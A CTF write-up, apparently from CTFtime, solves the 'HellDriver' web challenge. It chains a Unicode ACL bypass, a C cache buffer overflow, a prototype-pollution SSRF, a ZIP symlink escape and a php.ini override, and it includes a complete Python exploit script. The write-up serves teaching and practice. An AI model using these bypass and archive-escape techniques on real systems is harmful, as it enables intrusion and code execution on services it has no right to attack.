# HellDriver

> **分类：** Web · **赛事：** KubSTU CTF 2026 Autumn · **1000 pts** · **日期：** 2026 年 10 月 11 日
> 题目作者：[@thxStuck](https://t.me/thankspIuxury) · Infrastructure Administrator：[@ZloyTapochek](https://t.me/ddsddmitriy)
> 由战队 **GR3B0M4** 撰写的社区（用户）writeup · 来源：https://ctftime.org/writeup/41136 (CTFtime)

## 📌 题目

一道价值 1000 分的 Web 题。应用由若干个经过代理的服务组成：外部边界上的 Caddy、带有内部 Vault 方法的 FastAPI 后端、一个名为 AetherCache 的自研 C 缓存，以及一个 PHP ImageProxy。只有把六个相互独立的弱点串成一条利用链，才能读到 flag。

## 🏁 解题思路

### TL;DR

在 HellDriver 中，需要把六个小漏洞串成一条链：通过 Unicode 归一化不一致绕过 ACL，溢出 AetherCache 中的一个 key 缓冲区，把一条 cache-entry 变成受信任的元数据，污染原型（prototype）并获得 SSRF，借助 symlink 把一个 ZIP 还原（restore）到解压目录之外，以及通过自定义 `php.ini` 削弱 PHP sandbox。

最终的链条如下：

```text
Caddy ACL bypass
  → update_meta
  → AetherCache flags = 1
  → prototype pollution
  → SSRF во внутренний restore
  → ZIP symlink escape
  → перезапись php-overrides.ini
  → action=readflag
```

### 侦察

应用由若干个经过代理的服务组成：外部边界上的 Caddy、带有内部 Vault 方法的 FastAPI、一个自研 C 缓存 AetherCache 以及一个 PHP ImageProxy。最终链条需要用到以下这些点：

| 方法 | Endpoint | 用途 |
|---|---|---|
| `POST` | `/api/register` | 创建一个 tenant 会话 |
| `PUT` | `/api/internal/vault/update_meta` | 向 AetherCache 写入 metadata；被 ACL 封锁 |
| `GET` | `/market?meta=...` | 从缓存读取一条原始的 metadata 记录 |
| `POST` | `/api/vault/upload` | 上传后续要用的 ZIP |
| `GET` | `/imageproxy/api?action=...` | 在 tenant sandbox 中运行 PHP |

`robots.txt` 泄露了受保护接口 `update_meta` 的名称。对它的普通请求始终得到 Caddy `403`；而一个不存在的 FastAPI 路由会返回 JSON `404`。这样就能清楚地把边界（edge）的拦截与上游（upstream）的响应区分开，并测试各种路径归一化的变体。

### 1. ACL 绕过与 AetherCache 溢出

受保护的接口存在于：

```http
PUT /api/internal/vault/update_meta
```

在普通路径上 Caddy 返回 `403 Forbidden`。但边界和上游对 Unicode 的归一化方式不同。如果把 `internal` 中的第一个 `i` 换成无点 i `ı`（`U+0131`），请求就绕过了 ACL，而后端仍然选中了正确的处理器：

```http
PUT /api/%C4%B1nternal/vault/update_meta
Content-Type: application/json
Cookie: __Host-AV=...

{}
```

响应 `200 {"ok":true}` 确认了完整的绕过：这并不是 `403 → 404` 的转变，而是命中了一个已存在的 `PUT` endpoint。

`update_meta` 把数据存储在键 `meta:<symbol>` 之下。`symbol` 字段进入一个固定的 C 缓冲区，从第 256 个字符开始，后续字节会覆盖 32 位的 `flags` 字段：

```text
symbol length 255 → flags = 0
symbol length 256, последний байт "A" → flags = 65
symbol = "E" * 255 + "\x01" → flags = 1
```

缓存键被限制为 255 字节。由于 `meta:` 前缀占五个字节，溢出后的记录必须用它的前 250 个字符来读取：

```http
GET /market?meta=EEEE...EEEE   # ровно 250 символов
```

当 `flags=1` 时，Market 会选择处理 cache-entry 的不安全分支（`card-trade-unsafe`）。

### 2. Prototype pollution 变成 SSRF

最重要的细节是 `value` 字段：它必须是一个 **JSON 字符串**，而不是一个嵌套的 JSON 对象。可用的值如下：

```json
{
  "__proto__": {"allowLocalFetch": true},
  "zipPath": "/srv/<tid>/uploads/<uuid>"
}
```

污染 cache-entry 的完整请求：

```python
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})

session.put(
    BASE + "/api/%C4%B1nternal/vault/update_meta",
    json={"symbol": symbol, "value": value},
)
```

通过 `/market?meta=<250-byte-prefix>` 读取之后，应用会解析这个受信任的值，并把它不安全地合并进配置里。config 自身并没有 `allowLocalFetch` 键，于是查找就落到了被污染的原型里。普通的 `zipPath` 键则为内部 restore 请求设定了路径。

一开始用一个不存在的文件就能方便地验证：

```json
{
  "status": 404,
  "body": "{\"detail\":\"zip not found\"}"
}
```

也就是说，SSRF 已经生效，并能触达内部的还原（restore）服务。

### 3. ZIP symlink escape 与逃出 PHP sandbox

Vault 以 MIME 类型 `text/plain` 接受一个 ZIP，并返回一个随机名称：

```json
{"ok":true,"stored_as":"c06666494b504532af55b3005aca0abf"}
```

直接的 Zip Slip 被拦截：

```json
{"detail":"unsafe entry: ../php-overrides.ini"}
```

然而 extractor 信任了压缩包内的一个 Unix symlink。Restore 把文件解压到 `/srv/<tid>/unzip`，因此压缩包创建了链接 `escape → ..`，而下一条记录便顺着它穿越进了 tenant sandbox 的根目录：

```text
archive.zip
├── escape -> ..
└── escape/php-overrides.ini
```

`php-overrides.ini` 的内容清空了各项限制：

```ini
open_basedir=
disable_functions=
```

解压之后，文件落在路径 `/srv/<tid>/php-overrides.ini`。ImageProxy 这样运行每一个请求：

```text
php -c /srv/<tid>/php-overrides.ini -f /app/imagesvc/index.php
```

于是下一个请求启动 PHP 时已经没有了 `disable_functions`。`readflag` 操作调用 `/readflag` 并返回了这个 secret：

```http
GET /imageproxy/api?action=readflag
```

```json
{"ok":true,"flag":"kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}"}
```

### 完整 exploit

```python
#!/usr/bin/env python3
import io
import json
import re
import stat
import zipfile

import requests

BASE = "https://159.194.249.254:8443"
UPDATE_META = "/api/%C4%B1nternal/vault/update_meta"

requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False

# Register a tenant.
s.post(BASE + "/api/register", allow_redirects=False).raise_for_status()
tid = s.cookies.get("__Host-AV").split(".", 1)[0]

# Build the symlink archive.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
    link = zipfile.ZipInfo("escape")
    link.create_system = 3
    link.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(link, "..")
    zf.writestr("escape/php-overrides.ini", "open_basedir=\ndisable_functions=\n")

# Upload it as an ordinary Vault document.
r = s.post(
    BASE + "/api/vault/upload",
    files={"file": ("restore.txt", buf.getvalue(), "text/plain")},
)
r.raise_for_status()
stored_as = r.json()["stored_as"]

# Overflow cache flags and inject the trusted metadata value.
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})
r = s.put(
    BASE + UPDATE_META,
    json={"symbol": symbol, "value": value},
)
r.raise_for_status()

# Reading the poisoned entry triggers the internal restore.
r = s.get(BASE + "/market", params={"meta": meta}, timeout=20)
r.raise_for_status()
assert "extracted" in r.text

# The overwritten ini enables the final command execution sink.
r = s.get(BASE + "/imageproxy/api", params={"action": "readflag"})
r.raise_for_status()
print(re.search(r"kubstu\{[^}]+\}", r.text).group(0))
```

输出：

```text
kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}
```

### 关键要点

- `403 → 404` 的转变还不能证明 ACL 绕过；一次成功的绕过必须触达真正的上游处理器。
- 在语言边界处，重要的不仅是检查字符串的长度，还要检查结构体字段的物理布局。`symbol[255]` 之后的一个字节彻底改变了 cache-entry 的语义。
- 一个 JSON 对象与一个包含 JSON 的字符串在这里有本质区别：prototype pollution 只有在对 `value` 进行第二次解析之后才会触发。
- 在没有安全处理 symlink 的情况下检查 ZIP 条目名，并不能阻止逃出解压目录。
- 自定义 `php.ini` 是一道完整的安全边界：能够覆写它，就等同于去掉了 `open_basedir` 和 `disable_functions`。

**Flag:** `kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}`
